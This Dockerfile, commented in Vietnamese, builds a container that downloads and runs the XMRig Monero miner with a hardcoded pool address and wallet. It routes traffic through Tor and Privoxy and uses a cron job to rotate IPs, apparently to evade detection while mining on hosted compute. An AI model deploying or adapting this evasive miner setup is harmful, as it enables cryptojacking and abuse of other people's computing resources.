# Sử dụng image cơ bản từ Ubuntu 20.04
FROM ubuntu:20.04

# Cài đặt các package cần thiết bao gồm Tor và Privoxy
RUN apt-get update && apt-get install -y \
    torsocks \
    wget \
    tor \
    privoxy \
    cron \
    && apt-get clean

# Thiết lập các biến môi trường và thông số XMRig
ENV VERSION="6.21.0" \
    WORK_DIR="/root/work" \
    POOL="47.238.48.153:8080" \
    USERNAME="44XbJdyExZZbCqrGyvG1oUbTpBL8JNqHVh8hmYXgUfEHgHs4t45yMfKeTAUQ4dDNtPc2vXhj83uJf1byNSgwU9ZYFxgT3Ao" \
    ALGO="rx/0" \
    DONATE="1" \
    TOR_PORT="9051"

# Tạo thư mục làm việc
RUN mkdir -p $WORK_DIR

# Tải xuống và giải nén XMRig
RUN wget https://github.com/xmrig/xmrig/releases/download/v${VERSION}/xmrig-${VERSION}-linux-x64.tar.gz -P $WORK_DIR \
    && tar -xvzf $WORK_DIR/xmrig-${VERSION}-linux-x64.tar.gz -C $WORK_DIR

# Sao chép file cấu hình privoxy và tor vào container
COPY config /etc/privoxy/config
COPY torrc /etc/tor/torrc

# Cấp quyền cho cấu hình Tor và Privoxy
RUN chmod 644 /etc/tor/torrc && chmod 644 /etc/privoxy/config

# Sao chép file change_ip.sh và start.sh vào container
COPY change_ip.sh /root/change_ip.sh
COPY start.sh /root/start.sh

# Cấp quyền thực thi cho các script
RUN chmod +x /root/change_ip.sh && chmod +x /root/start.sh

# Thiết lập cron để tự động chạy đổi IP
RUN (crontab -l; echo "@reboot /root/change_ip.sh") | crontab -

# Khởi chạy XMRig và các dịch vụ
CMD ["/root/start.sh"]
